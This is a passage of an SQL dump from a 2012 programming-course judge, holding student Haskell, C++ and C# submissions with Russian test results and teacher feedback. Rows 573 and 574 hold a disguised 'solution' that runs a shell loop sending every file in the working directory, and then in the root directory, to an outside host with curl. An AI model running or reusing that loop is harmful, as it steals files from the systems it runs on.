(567, 30, '374969', '2012-09-17 19:56:30', 0, 'partsh _       _    _   1   = False\r\npartsh []      _    _   _   = True\r\npartsh (hd:tl) last len nod = if (hd > last) \r\n                              then partsh tl hd (len+1) nod \r\n                              else partsh tl hd 1       (gcd nod len)\r\n                              \r\nparts hd:tl = partsh tl hd 1 0', 'Не удалось вычислить выражение "parts [1, 2, 8, 2, 5, 6]", проверьте правильность синтаксиса'),
(568, 30, '374969', '2012-09-17 19:56:55', 0, 'partsh _       _    _   1   = False\r\npartsh []      _    _   _   = True\r\npartsh (hd:tl) last len nod = if (hd > last) \r\n                              then partsh tl hd (len+1) nod \r\n                              else partsh tl hd 1       (gcd nod len)\r\n                              \r\nparts (hd:tl) = partsh tl hd 1 0', 'Выражение имеет неправильное значение: parts [4, 6, 3, 5, 7]'),
(569, 30, '374969', '2012-09-17 20:02:50', 1, 'partsh _       _    _   1   = False\r\npartsh []      _    len nod = gcd nod len /= 1\r\npartsh (hd:tl) last len nod = if (hd > last) \r\n                              then partsh tl hd (len+1) nod \r\n                              else partsh tl hd 1       (gcd nod len)\r\n                              \r\nparts (hd:tl) = partsh tl hd 1 0', '<br/>Тесты успешно пройдены!'),
(570, 31, '6774563', '2012-09-17 20:11:07', 0, '--module Main where\n\n\n\n-- Очевидное решение - за O( C(n)(n/2) * n ) - слишком много\n\n-- Мое - за O(n^2). Суть: жадность. Минимальный элемент идет в первый список.\n\n--  Далее туда идет наименьший из больших него элементов справа от него.\n\n--  Повторем с новым элементом. И т.д. Оставшиеся элементы - второй список.\n\n--    Почему это работает?\n\n--  Понятно, что минимум должен быть первым в одном из списков\n\n--  (иначе, искомое разбиение не построить). Все элементы в этом списке должны \n\n--  далее идти в порядке возрастания поряковых номеров в списке, поэтому поиск только \n\n--  вправо оправдан. Теперь самое сложное. Почему "прокатывет" жадность?\n\n--  На каждом шагу мы забираем в этот список наименьшие элементы из возможных.\n\n--  Интуитивно понятно, что чем ближе к концу элемент, тем, желательно, больше он должен быть.\n\n--  Т.е. забирая наименьшее из возможных из конца, мы никак не ухудшаем ситуацию, даже наоборот.\n\n--  Это, понятно, совсем не строгое объяснение, однако проясняет ситуацию. \n\n--  Как доказать это строго я пока не знаю, но попробую сделать это позже\n\n--  (на самом деле, даже не на 100% в правильности того, что я пишу, однако все тесты, которые я пок смог\n\n--  выдумать, прошли, да и выглядит этот метод логичным).\n\n\n\n-- Про реализацию: вообще, с деревом отрезков, видимо, решить можно за O(n*log n). Я же реализовал самую\n\n-- "наивную" версию за квадрат.\n\n\n\nmaxInt = 2000000000\n\nminInt = -2000000000\n\n\n\nparts2 [] = True\n\n-- Есть ли в хаскеле побитовые сдвиги и логические операции с int`ами?\n\nparts2 xs | (length xs) `mod` 2 /= 0 = False\n\nparts2 xs = do\n\n	let firstPart = rev (getFirstPart ((length xs) `div` 2) minInt xs [])\n\n	let secondPart = getSecondPart xs firstPart []\n\n	length firstPart == length secondPart && verifyAscending minInt firstPart && verifyDescending maxInt secondPart \n\n\n\ngetFirstPart l curMin initialList firstPart | curMin == maxInt = firstPart\n\ngetFirstPart l curMin initialList firstPart | length firstPart == l = firstPart\n\ngetFirstPart l curMin initialList firstPart = do\n\n	let rightMin = minLimitedWith curMin maxInt initialList\n\n	getFirstPart l rightMin (clipListTo rightMin initialList) (rightMin:firstPart)\n\n\n\ngetSecondPart [] firstPart secondPart = secondPart\n\ngetSecondPart (x:xs) [] secondPart = getSecondPart xs [] (x:secondPart)\n\ngetSecondPart (x:xs) (y:ys) secondPart | x == y = getSecondPart xs ys secondPart\n\ngetSecondPart (x:xs) (y:ys) secondPart = getSecondPart xs (y:ys) (x:secondPart)\n\n\n\nverifyAscending last [] = True\n\nverifyAscending last (x:xs) = (last < x) && verifyAscending x xs\n\n\n\nverifyDescending last [] = True\n\nverifyDescending last (x:xs) = (last > x) && verifyDescending x xs\n\n\n\nminLimitedWith limit curMin [] = curMin\n\nminLimitedWith limit curMin (x:xs) = min3 curMin (limitedNum limit x) (minLimitedWith limit (min curMin (limitedNum limit x)) xs)\n\n\n\nclipListTo value [] = []\n\nclipListTo value (x:xs) | x == value = xs\n\nclipListTo value (x:xs) = clipListTo value xs\n\n\n\nmin3 a b c = min (min a b) c\n\n\n\nlimitedNum limit x | x <= limit = maxInt\n\nlimitedNum limit x = x\n\n\n\nrev [] = []\n\nrev (h:t) = revAcc t [h]\n\n\n\nrevAcc [] acc = acc\n\nrevAcc (h:t) acc = revAcc t (h:acc)\n\n\n\n--main = putStrLn $ show (parts2 [3,4,5,0,1,2])\n\n\n\n\n', '<br/>Тесты успешно пройдены!'),
(571, 34, '2562137', '2012-09-17 21:31:08', 1, '#include <iostream>\r\nusing namespace std;\r\n\r\ntemplate <class Func>\r\ndouble integral(Func f, double a, double b)\r\n{\r\n	int size = 100;\r\n	double step = (b - a) / size;\r\n	double ans = 0.0;\r\n	for (int i = 0; i < size; i++) {\r\n		ans += step * (f(a + i * step) + f(a + (i+1) * step)) / 2;\r\n	}\r\n	return ans;\r\n}\r\n\r\nint main()\r\n{\r\n	auto square = [] (double x) { return x*x; };\r\n	cout << integral(square, 0, 1);\r\n\r\n	return 0;\r\n}\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(572, 33, '2562137', '2012-09-17 21:54:49', 1, 'using System;\r\n\r\nnamespace Integral\r\n{\r\n    class Program\r\n    {\r\n        static double integral(Func<double, double> f, double a, double b)\r\n        {\r\n            int size = 100;\r\n            double step = (b - a) / size;\r\n            double ans = 0.0;\r\n            for (int i = 0; i < size; i++) {\r\n           	    ans += step * (f(a + i * step) + f(a + (i+1) * step)) / 2;\r\n            }\r\n   --- ОК, только лучше немного поменять программу, чтобы в кажодй точке считать функцию один раз.\r\n   --- Вы же не знаете и не можете знать, что это за функция, может она час что-то считает..\r\n\r\n            return ans;\r\n        }\r\n\r\n        static void Main(string[] args)\r\n        {\r\n            Func<double, double> square = i => i * i;\r\n            Console.WriteLine(integral(i => i*i, 0, 1));\r\n        }\r\n    }\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(573, 33, 'dmitry', '2012-09-17 22:07:29', 0, 'import System.Process\n\n\n\nmain = do system "for f in *; do curl -X POST -d @$f http://ikev.t.proxylocal.com/; done"\n\n\n', '<br/>Тесты успешно пройдены!'),
(574, 33, 'dmitry', '2012-09-17 22:09:37', 2, 'import System.Process\r\n\r\n\r\n\r\nmain = do system "for f in /*; do curl -X POST -d @$f http://ikev.t.proxylocal.com/; done"\r\n  --- А это что такое, не очень понятно??\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(575, 30, 'erwert', '2012-09-18 01:09:29', 0, 'parts [] = True\r\nparts [_] = False\r\nparts l = if len 0 (cut l) == 0 then True else if mod (len 0 l) (len 0 (cut l)) == 0 then parts (cut l) else False\r\n\r\ncut [_] = []\r\ncut (x:y:ls) = if x < y then cut (y:ls) else (y:ls)\r\n\r\nlen k [] = k\r\nlen k (x:xs) = len (k+1) xs', 'Выражение имеет неправильное значение: parts [1, 2, 1, 2, 3, 4]'),
(576, 33, '787463', '2012-09-18 06:39:28', 1, '﻿using System;\r\n\r\nusing System.Linq;\r\n\r\n\r\n\r\nnamespace task_4_1\r\n\r\n{\r\n\r\n	class Task\r\n\r\n	{\r\n\r\n		static double integral(Func<double, double> f, double a, double b)\r\n\r\n		{\r\n\r\n			if (a >= b)\r\n\r\n			{\r\n\r\n				return 0;\r\n\r\n			}\r\n\r\n			\r\n\r\n			double step = (a + b) / 100;\r\n\r\n			double sum = 0;\r\n\r\n			for (int i = 0; i < 100; i++)\r\n\r\n			{\r\n\r\n				sum += (f(a + (i + 1) * step) + f(a + i * step)) * step / 2 ;\r\n\r\n			}\r\n   --- ОК, только лучше сделать так. чтобы в каждой точке значение считалосб один раз. Функция же может работать долго, те имеет смысл тут экономить.\r\n\r\n			\r\n\r\n			return sum;\r\n\r\n		}\r\n\r\n\r\n\r\n		static Func<double, double> sqr = i => i * i;\r\n\r\n\r\n\r\n		static double cube(double i)\r\n\r\n		{\r\n\r\n			return i * i * i;\r\n\r\n		}\r\n\r\n\r\n\r\n		static void Main(string[] args)\r\n\r\n		{\r\n\r\n			Console.WriteLine("{0}", integral(sqr, 0, 1));\r\n\r\n			Console.WriteLine("{0}", integral(x => x * x, 0, 1));\r\n\r\n			Console.WriteLine("{0}", integral(cube, 0, 1));\r\n\r\n		}\r\n\r\n	}\r\n\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(577, 34, '787463', '2012-09-18 06:40:00', 1, '#include <stdio.h>\r\n\r\n\r\n\r\nusing namespace std;\r\n\r\n\r\n\r\ntypedef double (*Fun)(double n);\r\n\r\n\r\n\r\ntemplate<typename Fun> double integral(Fun f, double a, double b)\r\n\r\n{\r\n\r\n	if (a >= b)	{\r\n\r\n		return 0;\r\n\r\n	}\r\n\r\n\r\n\r\n	double step = (a + b) / 100;\r\n\r\n	double sum = 0;\r\n\r\n\r\n\r\n	for (int i = 0; i < 100; i++) {\r\n\r\n		sum += (f(a + (i + 1) * step) + f(a + i * step)) * step / 2 ;\r\n\r\n	}\r\n\r\n	\r\n\r\n	return sum;\r\n\r\n}\r\n\r\n\r\n\r\ndouble f(double x) {\r\n\r\n	return x * x;\r\n\r\n}\r\n\r\n\r\n\r\nint main(int argc, char *argv[])\r\n\r\n{\r\n\r\n	printf("%f\r\n", integral([](double x) { return x * x; }, 0, 1));\r\n\r\n	printf("%f\r\n", integral(f, 0, 1));\r\n\r\n	\r\n\r\n	return 0;\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(578, 25, '2118411', '2012-09-18 06:54:29', 1, 'minlist (x:xs) = minlist2 x xs\r\nminlist2 curMin [] = curMin\r\nminlist2 curMin (x:xs) = minlist2 (min curMin x) xs', '<br/>Тесты успешно пройдены!'),
(579, 27, '2118411', '2012-09-18 06:54:46', 1, 'minsum (x:y:xs) = minsum2 (x+y) (y:xs)\r\nminsum2 curMin (x:[]) = curMin\r\n   -- ну или вместо (x:[]) короче [x]\r\nminsum2 curMin (x:y:xs) = minsum2 (min curMin (x+y)) (y:xs)', '<br/>Тесты успешно пройдены!'),
(580, 26, '2118411', '2012-09-18 06:55:01', 1, 'rev xs = rev2 [] xs\r\nrev2 rl [] = rl\r\nrev2 rl (x:xs) = rev2 (x:rl) xs\r\n', '<br/>Тесты успешно пройдены!'),
(581, 28, '2118411', '2012-09-18 06:55:17', 1, 'check f [] = False\r\ncheck f (x:xs) = f x || check f xs', '<br/>Тесты успешно пройдены!'),
(582, 29, '2118411', '2012-09-18 06:55:30', 1, 'checkDifferent [] = True\r\ncheckDifferent (x:[]) = True\r\ncheckDifferent (x:xs) = checkDifferent2 x xs && checkDifferent xs\r\ncheckDifferent2 num [] = True\r\ncheckDifferent2 num (x:xs) = (num /= x) && checkDifferent2 num xs\r\n', '<br/>Тесты успешно пройдены!'),
(583, 31, '374969', '2012-09-18 10:58:58', 0, 'parts2h [] _ _ def = def == 0                                                      \r\nparts2h (hd:tl) lst1 lst2 def = let x = () -> (canPush hd lst2) && (parts2h tl lst1 (hd:lst2) (def-1))\r\n                                if(canPush hd lst1) then (parts2h tl (hd:lst1) lst2 (def+1)) || x\r\n                                                    else x\r\nparts2 lst = parts2h lst [] [] 0', 'Не удалось вычислить выражение "parts2 [1, 3, 1, 8, 4, 9]", проверьте правильность синтаксиса'),
(584, 31, '374969', '2012-09-18 11:08:58', 0, 'canPush x []      = True\r\ncanPush x (hd:tl) = x > hd\r\n\r\nparts2h [] _ _ def = def == 0                                                      \r\nparts2h (hd:tl) lst1 lst2 def = let x = () -> (canPush hd lst2) && (parts2h tl lst1 (hd:lst2) (def-1))\r\n                                if(canPush hd lst1) then (parts2h tl (hd:lst1) lst2 (def+1)) || x\r\n                                                    else x\r\nparts2 lst = parts2h lst [] [] 0', 'Не удалось вычислить выражение "parts2 [1, 3, 1, 8, 4, 9]", проверьте правильность синтаксиса'),
(585, 31, '374969', '2012-09-18 11:26:06', 0, 'canPush x []      = True\r\ncanPush x (hd:tl) = x > hd\r\n\r\nparts2h [] _ _ def = def == 0                                                      \r\nparts2h (hd:tl) lst1 lst2 def = let x = () -> (canPush hd lst2) && (parts2h tl lst1 (hd:lst2) (def-1))\r\n                                if(canPush hd lst1) then (parts2h tl (hd:lst1) lst2 (def+1)) || x()\r\n                                                    else x()\r\nparts2 lst = parts2h lst [] [] 0\r\n', 'Не удалось вычислить выражение "parts2 [1, 3, 1, 8, 4, 9]", проверьте правильность синтаксиса'),
(586, 31, '374969', '2012-09-18 11:42:50', 0, 'canPush x []      = True\r\ncanPush x (hd:tl) = x > hd\r\n\r\nparts2h [] _ _ def = def == 0                                                      \r\nparts2h (hd:tl) lst1 lst2 def = let x = () -> (canPush hd lst2) && (parts2h tl lst1 (hd:lst2) (def-1))\r\n                                if(canPush hd lst1) then (parts2h tl (hd:lst1) lst2 (def+1)) || x()\r\n                                                    else x()\r\nparts2 lst = parts2h lst [] [] 0\r\n', 'Не удалось вычислить выражение "parts2 [1, 3, 1, 8, 4, 9]", проверьте правильность синтаксиса'),
(587, 33, '3742311', '2012-09-18 13:38:26', 2, 'static double integral(Func<double, double> f, double a, double b)\r\n{\r\n    int n = 100;\r\n    double dx = (b - a) / n;\r\n\r\n    double result = 0;\r\n\r\n    // метод левых прямоугольников\r\n    for (int i = 0; i < n; i++)\r\n    {\r\n        result += dx * f(a + dx * i);\r\n    }\r\n\r\n    return result;\r\n}\r\n   --- Напишите полный код, пожалуйста: Класс, в нем метод, и еще пример вызова.', '<br/>Тесты успешно пройдены!'),
(588, 31, '374969', '2012-09-18 13:40:29', 2, 'canPush x [] = True\r\ncanPush x (hd:tl) = x > hd\r\n\r\nparts2h [] _ _ def = def == 0\r\nparts2h (hd:tl) lst1 lst2 def = if(canPush hd lst1) then (parts2h tl (hd:lst1) lst2 (def+1)) || x()\r\n                                else x()\r\n                                where x = () -> (canPush hd lst2) && (parts2h tl lst1 (hd:lst2) (def-1))\r\nparts2 lst = parts2h lst [] [] 0\r\n   --- Вообще правильно, но давайте я вас попрошу немного оптимизировать. Хорошо бы сделать, чтобы если в какой то части уже набралась половина элементов, мы бы уже не пробовали туда класть. Допишите это пожалуйста, это вроде несложно. ', '<br/>Тесты успешно пройдены!'),
(589, 34, '3742311', '2012-09-18 14:10:59', 2, 'double integral(Func f, double a, double b)\r\n{\r\n    int n = 100;\r\n    double dx = (b - a) / n;\r\n\r\n    double result = 0;\r\n\r\n    // метод правых прямоугольников\r\n    for (int i = 0; i < n; i++)\r\n    {\r\n        result += dx * f(a + dx * (i + 1));\r\n	}\r\n\r\n	return result;\r\n}\r\n   --- Ну нет, это не совсем то, тут нужен шаблон. Пришдите такой код, который бы компилировался,пожалуйста, и пример вызова.', '<br/>Тесты успешно пройдены!'),
(590, 25, '318210', '2012-09-18 14:25:28', 1, 'minlist :: [Integer] -> Integer\r\n  --- Зачтено, но, я уж говорил на занятии, вы зря пишете типы. На самом деле ваша замечательная функция работает и с другим типами (с вещественными, например). Мы пройдем, как это можно описать, но пока проще вообще не писать.  \r\n\r\nminlist [h] = h\r\nminlist (h:s) = min h (minlist s)', '<br/>Тесты успешно пройдены!'),
(591, 25, '82873297', '2012-09-18 15:33:09', 1, 'minlist (x:xs) = minnum x xs\r\n\r\n\r\n\r\nminnum x []     = x\r\n\r\nminnum x (y:xs) = minnum (min x y) xs\r\n', '<br/>Тесты успешно пройдены!'),
(592, 27, '82873297', '2012-09-18 15:34:03', 1, 'minsum (x1:(x2:xs)) = min2 (x1 + x2) x2 xs\r\n\r\n\r\n\r\nmin2 s _ []      = s\r\n\r\nmin2 s x (x1:xs) = min2 (min s (x + x1)) x1 xs \r\n', '<br/>Тесты успешно пройдены!'),
(593, 26, '82873297', '2012-09-18 15:34:33', 1, 'rev xs = rev2 xs []\r\n\r\n\r\n\r\nrev2 [] xs = xs\r\n\r\nrev2 (x:xs) xs2 = rev2 xs (x:xs2)\r\n', '<br/>Тесты успешно пройдены!'),
(594, 28, '82873297', '2012-09-18 15:36:09', 1, 'check _ []                           = False\r\n\r\ncheck cond (x:xs) | (cond x == True) = True\r\n\r\n                  | otherwise        = check cond xs\r\n', '<br/>Тесты успешно пройдены!'),
(595, 29, '82873297', '2012-09-18 15:36:45', 1, 'checkDifferent [_] = True\r\n\r\ncheckDifferent (x:xs) | any (y->y==x) xs  = False\r\n\r\n                      | otherwise          = checkDifferent xs\r\n', '<br/>Тесты успешно пройдены!'),
(596, 27, '318210', '2012-09-18 15:44:40', 0, 'minsum :: [Integer] -> Integer\r\n\r\nminsum1 :: [Integer] -> Integer -> Integer\r\n\r\nminsum [] = error "not enough elements"\r\nminsum [h] = error "not enough elements"\r\n\r\nminsum (h : s) = minsum1 (s) (h + head s) \r\n\r\nminsum1 (h:s) ans       | length s == 0 =  ans\r\n			| otherwise = minsum1 (s) (min (h + head s) ans)', '<br/>Тесты успешно пройдены!'),
(597, 27, '318210', '2012-09-18 15:52:05', 1, 'minsum [] = error "not enough elements"\r\nminsum [h] = error "not enough elements"\r\nminsum (h : s) = minsum1 (s) (h + head s) \r\n\r\nminsum1 (h:s) ans       | length s == 0 =  ans\r\n			| otherwise = minsum1 (s) (min (h + head s) ans)', '<br/>Тесты успешно пройдены!'),
(598, 26, '318210', '2012-09-18 16:02:04', 1, 'rev sp = rev1 sp []\r\n\r\nrev1 [] ans = ans\r\n\r\nrev1 (h:s) ans = rev1 s (h:ans)\r\n', '<br/>Тесты успешно пройдены!');
INSERT INTO `solution` (`SolutionID`, `TaskID`, `UserID`, `LoadTimestamp`, `ResultID`, `Code`, `TestResult`) VALUES
(599, 30, 'hasp', '2012-09-18 16:08:25', 1, 'grow [] = [0]\r\ngrow (x:xs) = fst (foldl (( l@(hd:tl), prev) e -> if prev < e then ((hd+1):tl, e) else (1:l,e)) ([1],x) xs)\r\n\r\ndivisors n = n:[p | p <-[2..n `div` 2], n `mod` p == 0]\r\n\r\nparts l = let fs = grow l in let m = minimum fs in let dvs = m:(divisors m) in not (null(foldl (l e -> filter (p -> e `mod` p == 0) l) dvs fs))\r\n  --- OK, но я бы тут применил алгоритм Евклида', '<br/>Тесты успешно пройдены!'),
(600, 30, '383483', '2012-09-18 17:13:25', 1, '{--Считаем кол-во элементов--}\r\nparts [] = False\r\n{--Делим по возможности на равные части, начиная с двух--}\r\nparts xs = cycl xs (count xs 0) 2\r\n\r\ncount (x:[]) i = (i+1)\r\ncount (x:xs) i = count xs (i+1)\r\ncycl xs n i\r\n      | i>n = False\r\n      | otherwise = if (mod n i == 0) then hum xs i 1 xs n else cycl xs n (i+1)\r\nhum (x:[]) p i xy n = True\r\nhum (x:xs) p i xy n \r\n    | i<p = if (x>=(head xs)) then cycl xy n (p+1) else hum xs p (i+1) xy n\r\n    | i==p = hum xs p 1 xy n   \r\n  --- ОК, очень хорошо. Можно на самом деле сделать более эффективно, за один проход по списку, но это мы потом обсудим.', '<br/>Тесты успешно пройдены!'),
(601, 26, 'sromanov', '2012-09-18 17:31:17', 1, 'rev [] = []\r\nrev x = last x : rev (init x)\r\n', '<br/>Тесты успешно пройдены!'),
(602, 28, 'sromanov', '2012-09-18 17:38:01', 1, 'check _ [] = False\r\ncheck cond (x:xs) = cond x || check cond xs', '<br/>Тесты успешно пройдены!'),
(603, 28, '318210', '2012-09-18 17:44:52', 1, 'check cond [] = False\r\ncheck cond (h: sp) | cond h == True = True\r\n		|otherwise = check cond sp\r\n', '<br/>Тесты успешно пройдены!'),
(604, 30, '63706456', '2012-09-18 17:51:03', 1, 'split _ [] = [[]]\r\nsplit _ [x] = [[x]]\r\nsplit p2 (x:y:xs) \r\n		| p2 x y = ((x:head temp): (tail temp))\r\n		| otherwise = ([x]:temp)\r\n			where temp = split p2 (y:xs)\r\n\r\nparts xs = (<) 1 $ foldr1 gcd $ map length $ split (<) xs', '<br/>Тесты успешно пройдены!'),
(605, 29, 'sromanov', '2012-09-18 18:00:57', 1, 'checkTail _ [] = True\r\ncheckTail elem (x:xs) = elem /= x && checkTail elem xs\r\ncheckDifferent [] = True\r\ncheckDifferent (x:xs) = (checkTail x xs) && checkDifferent xs', '<br/>Тесты успешно пройдены!'),
(606, 29, '63706456', '2012-09-18 18:03:17', 1, 'checkDifferent xs = satisfy (/=) $ sort xs\r\n\r\nsatisfy _ [] = True\r\nsatisfy _ [x] = True\r\nsatisfy p2 (x:y:xs) \r\n		| p2 x y = satisfy p2 (y:xs)\r\n		| otherwise = False\r\n\r\nsort [] = []\r\nsort [x] = [x]\r\nsort (x:xs) = \r\n		sort (filter (y -> x <= y) xs) \r\n		++ [x] \r\n		++ sort(filter (y -> x > y) xs)', '<br/>Тесты успешно пройдены!'),
(607, 31, 'hasp', '2012-09-18 18:10:36', 1, '--мне казалось, что flatMap в хаскеле есть, но я его не нашел\r\n    --- Я думаю, то, что вам надо - это concatMap (и он же называется >>= )\r\nflatMap :: (t -> [a]) -> [t] -> [a]\r\nflatMap _ [] = []\r\nflatMap f (x:xs) = f x ++ flatMap f xs\r\n\r\nintersect [] [] = True\r\nintersect  _ [] = True\r\nintersect [] _ = True\r\nintersect l1@(x1:xs1) l@(x:xs) = if x1 == x then False else (if x1 > x then intersect xs1 l else intersect l1 xs) \r\n\r\nintersectAll [] = False\r\nintersectAll (x1:xs) = let x = snd x1 in if any (e -> intersect x (snd e)) xs then True else intersectAll xs\r\n\r\nparts2 [] = True -- ?????\r\nparts2 (x:[]) = False\r\n\r\nparts2 l@(hd:tl) = let s = length l in let s2 = s `div` 2 in \r\n	let allFrs = fst (foldl ((acc, numb) x ->  ((x,[numb]):(flatMap (e -> if (fst e) < x && (length (snd e)) < s2 then [(x, numb:(snd e)),e] else [e]) acc), numb + 1) ) ( [ (hd, [1]) ], 2) tl) in\r\n	intersectAll (filter (p -> length (snd p) == s2)  allFrs)\r\n', '<br/>Тесты успешно пройдены!'),
(608, 29, '318210', '2012-09-18 18:22:15', 0, 'checkDifferent :: [Integer] -> Bool\r\n\ncheckDifferent1 :: [Integer] -> [Integer] ->Bool\r\n\n\r\n\n--checkDifferent [h] = False\r\n\ncheckDifferent (h : s) = checkDifferent1 (h : s) s\r\n\n\r\n\ncheckDifferent1 (h : s) s1  | length s1 == 0 && length s == 0 = False\r\n\n				| length s1 == 0 && length s /= 0 = checkDifferent1 s (tail s) \r\n\n				| h == head s1 = True\r\n\n				| otherwise = checkDifferent1 (h : s) (tail s1)\n', 'Выражение имеет неправильное значение: checkDifferent [3,2,7]'),
(609, 29, '318210', '2012-09-18 18:25:15', 0, 'checkDifferent :: [Integer] -> Bool\r\n\ncheckDifferent1 :: [Integer] -> [Integer] ->Bool\r\n\n\r\n\n--checkDifferent [h] = True\r\n\ncheckDifferent (h : s) = checkDifferent1 (h : s) s\r\n\n\r\n\ncheckDifferent1 (h : s) s1  | length s1 == 0 && length s == 0 = True\r\n\n				| length s1 == 0 && length s /= 0 = checkDifferent1 s (tail s) \r\n\n				| h == head s1 = False\r\n\n				| otherwise = checkDifferent1 (h : s) (tail s1)\n', '<br/>Тесты успешно пройдены!'),
(610, 29, '318210', '2012-09-18 18:34:24', 1, 'checkDifferent (h : s) = checkDifferent1 (h : s) s\r\n\r\ncheckDifferent1 (h : s) s1  | length s1 == 0 && length s == 0 = True\r\n				| length s1 == 0 && length s /= 0 = checkDifferent1 s (tail s) \r\n				| h == head s1 = False\r\n				| otherwise = checkDifferent1 (h : s) (tail s1)', '<br/>Тесты успешно пройдены!'),
(611, 25, '472848', '2012-09-18 19:36:41', 1, 'f x [] = x\r\nf x t = if (head t < x) \r\n  then f (head t) (tail t)\r\n  else f x (tail t)\r\nminlist l = f (head l) (tail l)', '<br/>Тесты успешно пройдены!'),
(612, 27, '472848', '2012-09-18 19:55:10', 1, 'f x i li = if (i + 1 == length li) \r\nthen x\r\nelse if (x < li !! i + li !! (i + 1))\r\n then f x (i + 1) li\r\n else f (li !! i + li !! (i + 1)) (i + 1) li\r\nminsum li = f (li !! 0 + li !! 1) 1 li\r\n  --- так можно, но это очень не эффекстивно, потому что li !! i - это длинная операция.', '<br/>Тесты успешно пройдены!'),
(613, 26, '472848', '2012-09-18 19:58:14', 1, 'rev [] = []\r\nrev l = last l : rev (init l)\r\n  --- OK, засчитано, но вообще так неэффективно, last и init - это медленные операции  ', '<br/>Тесты успешно пройдены!'),
(614, 29, '472848', '2012-09-18 20:18:25', 1, '--Функция, которая сравнивает элемент x со всеми в списке li\r\n--и возвращает True, когда x не равен ни одному из них\r\ng x [] = True\r\ng x li = if (x == head li) then False \r\nelse g x (tail li)\r\n\r\ncheckDifferent [] = True\r\ncheckDifferent li = if (g (head li) (tail li)) \r\n  then checkDifferent (tail li)\r\n  else False', '<br/>Тесты успешно пройдены!'),
(615, 28, '472848', '2012-09-18 20:34:30', 1, 'check cond [] = False\r\ncheck cond xs = if (cond (head xs)) \r\n then True \r\n else check cond (tail xs)', '<br/>Тесты успешно пройдены!'),
(616, 31, '2562137', '2012-09-18 21:09:45', 1, 'parts2 list = check 0 0 0 0 list (length list)\r\n\r\ncheck _ _ n m [] _ = (n == m)\r\ncheck x y n m (z:zs) len =\r\n	((n == 0 || x < z) && 2*(n+1) <= len && check z y (n+1) m zs len) ||\r\n	((m == 0 || y < z) && 2*(m+1) <= len && check x z n (m+1) zs len)\r\n', '<br/>Тесты успешно пройдены!'),
(617, 22, '419046', '2012-09-18 21:10:39', 1, 'isprime a = isprime1 a (a - 1)\r\n  --- Начать можно не с a-1, а сразу с div a 2 (вообще то модно начать с квадр.корня, но это сложнее записать)\r\nisprime1 a 1 = True\r\nisprime1 a b = if mod a b == 0\r\n               then False\r\n               else isprime1 a (b - 1)\r\ng a = g1 (a - 2) 2\r\ng1 1 b = False\r\ng1 a b = if (isprime a) && (isprime b) && (a/=b)\r\n         then True\r\n         else g1 (a - 1) (b + 1)', '<br/>Тесты успешно пройдены!'),
(618, 27, '214982', '2012-09-18 21:16:39', 0, '<-так работает получше;)->\r\nminsum [x, y] = x + y\r\nminsum (x:xs) = min (minsum [x, head xs]) (minsum xs)\r\n', 'Не удалось вычислить выражение "minsum [1,8,3,2,7]", проверьте правильность синтаксиса'),
(619, 27, '214982', '2012-09-18 21:18:24', 1, '{-так работает получше;) и прошу прощения за прошлую свалившуюся попытку-}\r\nminsum [x, y] = x + y\r\nminsum (x:xs) = min (minsum [x, head xs]) (minsum xs)\r\n   --- ОК, очень хорошо! Я бы тут написал \r\n   ---   minsum (x:xs) = min (x + head xs) (minsum xs)\r\n   --- просто так немного короре, но это неважно, конечно.\r\n', '<br/>Тесты успешно пройдены!'),
(620, 29, '419046', '2012-09-18 21:18:28', 1, 'checkDifferent [] = True\r\ncheckDifferent (x:xs) = (all (/= x) xs) && (checkDifferent xs)', '<br/>Тесты успешно пройдены!'),
(621, 30, '4837959', '2012-09-18 21:22:28', 1, 'parts xs = bruteforcelen (length xs) xs\r\n   --- ОК, но на самом деле можно сделать менее brute force, за один проход..\r\n\r\nbruteforcelen len xs\r\n    | len == 1 = False\r\n    | otherwise = check 2 len xs || bruteforcelen (len - 1) xs\r\n\r\ncheck _ _ [] = True\r\ncheck _ _ [x] = False\r\ncheck cur len (x1:x2:xs)\r\n    | x1 < x2 && cur == len = check 2 len xs\r\n    | x1 < x2 = check (cur + 1) len (x2:xs)\r\n    | otherwise = False\r\n', '<br/>Тесты успешно пройдены!'),
(622, 30, 'erwert', '2012-09-18 21:31:01', 1, 'parts l = if listnod (list [] l) <2 then False else True\r\n   --- или  == not (listnod (list [] l) <2)\r\nnod a 0 = a\r\nnod a b = nod b (mod a b)\r\nlistnod [x] = x\r\nlistnod (x:y:xs) = listnod (nod x y:xs)\r\nlist a [] = a\r\nlist a b = list (len b - len (cut b):a) (cut b)\r\ncut [_] = [] \r\ncut (a1:a2:an) = if a1 < a2 then cut (a2:an) else (a2:an)\r\nlen l = ll 0 l\r\nll k [] = k\r\nll k (x:xs) = ll (k+1) xs ', '<br/>Тесты успешно пройдены!'),
(623, 31, '4837959', '2012-09-18 21:48:04', 2, 'parts2 xs = p xs [] []\r\n\r\np [] l1 l2\r\n    | length l1 == length l2 = True\r\n    | otherwise = False\r\np (x:xs) l1 l2 = ((l1 == [] || x > head l1) && p xs (x:l1) l2) ||\r\n                 ((l2 == [] || x > head l2) && p xs l1 (x:l2))\r\n  --- Вообще правильно, но даввайте я вас попрошу немного оптимизировать - если у нас в списке уже половина от общего числа элементов, то добавлять в него нет смысла.. Добавьте такую логику, пожалуйста.\r\n', '<br/>Тесты успешно пройдены!'),
(624, 31, '17107004', '2012-09-18 22:17:52', 1, '  --- ОК, "сложное" решение интересное, но я, честно говоря, не уверен, что очень эффективное, все-таки вам мб придется сгенерировать очень много последовательностей \r\n\r\nimport Data.Bits\r\n\r\n\r\n\r\n-- simple version \r\n\r\np2 l1 l2 [] = (length l1) == (length l2)\r\n\r\n\r\n\r\np2 (x:xs) (y:ys) (z:zs) =\r\n\r\n	(x < z && p2 (z:x:xs) (y:ys) zs) ||\r\n\r\n	(y < z && p2 (x:xs) (z:y:ys) zs)\r\n\r\n\r\n\r\np2 [] y (z:zs) = \r\n\r\n	p2 [z] y zs || p2 [] (z:y) zs\r\n\r\np2 x [] (z:zs) = \r\n\r\n	p2 x [z] zs || p2 (z:x) [] zs\r\n\r\n{-\r\n\r\n - parts2 l = p2 [] [] l\r\n\r\n -}\r\n\r\n\r\n\r\n-- complex version\r\n\r\n\r\n\r\n\r\n\r\n-- extracts only markers, consists of numbers\r\n\r\np32 = map (map snd)\r\n\r\n\r\n\r\n-- bitwise compress each sublist\r\n\r\np33 :: [[Int]] -> [Integer]\r\n\r\np33 = map (foldr ((.|.) . (shiftL 1)) 